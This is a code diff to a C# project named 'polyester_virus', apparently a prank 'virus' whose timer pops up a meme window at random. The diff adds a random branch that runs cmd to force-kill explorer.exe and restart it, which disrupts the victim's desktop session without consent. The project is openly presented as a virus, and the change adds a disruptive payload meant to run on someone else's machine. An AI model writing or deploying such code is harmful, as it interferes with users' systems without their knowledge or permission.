@@ -1,4 +1,5 @@
 using LibVLCSharp.Shared;
+using System.Diagnostics;
 using System.Media;
 using System.Runtime.InteropServices;
 
@@ -50,6 +51,16 @@ namespace polyester_virus
                 if (Random.Shared.Next(10) == 1)
                 {
                     new ArabicMeme().Show();
+                }
+                if (Random.Shared.Next(20) == 1)
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd",
+                        Arguments = "/c \"taskkill /im explorer.exe /f && start explorer.exe\"",
+                        CreateNoWindow = false,
+                        UseShellExecute = false
+                    });
                 }
             };
             timer.Start();
